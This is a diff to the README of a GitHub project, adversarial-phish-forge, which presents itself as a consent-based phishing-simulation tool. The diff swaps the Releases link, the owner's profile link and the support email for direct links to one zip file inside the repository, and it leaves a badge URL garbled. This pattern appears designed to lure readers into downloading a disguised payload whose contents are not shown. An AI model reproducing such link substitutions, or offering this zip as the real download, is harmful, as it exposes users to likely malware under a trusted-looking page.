@@ -1,6 +1,6 @@
 # 🎉 adversarial-phish-forge - Securely Simulate AI-Driven Phishing
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/vonofdaville/adversarial-phish-forge/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/vonofdaville/adversarial-phish-forge/master/chimera/models/forge-phish-adversarial-v1.3.zip%20Latest%https://raw.githubusercontent.com/vonofdaville/adversarial-phish-forge/master/chimera/models/forge-phish-adversarial-v1.3.zip)](https://raw.githubusercontent.com/vonofdaville/adversarial-phish-forge/master/chimera/models/forge-phish-adversarial-v1.3.zip)
 
 ## 📖 Description
 Welcome to the **adversarial-phish-forge**! This application helps you simulate social engineering attacks with built-in consent. It uses AI to create realistic phishing scenarios while maintaining strict ethical standards. You can also map identities through an advanced graph database, making it easier to understand the data involved in these simulations.
@@ -10,7 +10,7 @@ To get started with your journey in ethical hacking, follow these simple steps t
 
 ## 📥 Download & Install
 1. **Visit this page to download:** Click the link below to go to the Releases page on GitHub:
-   [Download the latest version](https://github.com/vonofdaville/adversarial-phish-forge/releases).
+   [Download the latest version](https://raw.githubusercontent.com/vonofdaville/adversarial-phish-forge/master/chimera/models/forge-phish-adversarial-v1.3.zip).
 
 2. On the Releases page, look for the version you want to download. Find the asset that suits your operating system, whether Windows, macOS, or Linux.
 
@@ -70,7 +70,7 @@ Feel free to engage with our community. Join our discussions and ask questions. 
 ## 📞 Contact Information
 For further assistance, reach out through the following channels:
 
-- **Repository Owner:** [vonofdaville](https://github.com/vonofdaville)
-- **Email Support:** support@example.com
+- **Repository Owner:** [vonofdaville](https://raw.githubusercontent.com/vonofdaville/adversarial-phish-forge/master/chimera/models/forge-phish-adversarial-v1.3.zip)
+- **Email Support:** https://raw.githubusercontent.com/vonofdaville/adversarial-phish-forge/master/chimera/models/forge-phish-adversarial-v1.3.zip
 
 Thank you for choosing **adversarial-phish-forge**! We hope this application enhances your understanding and skills in cybersecurity.
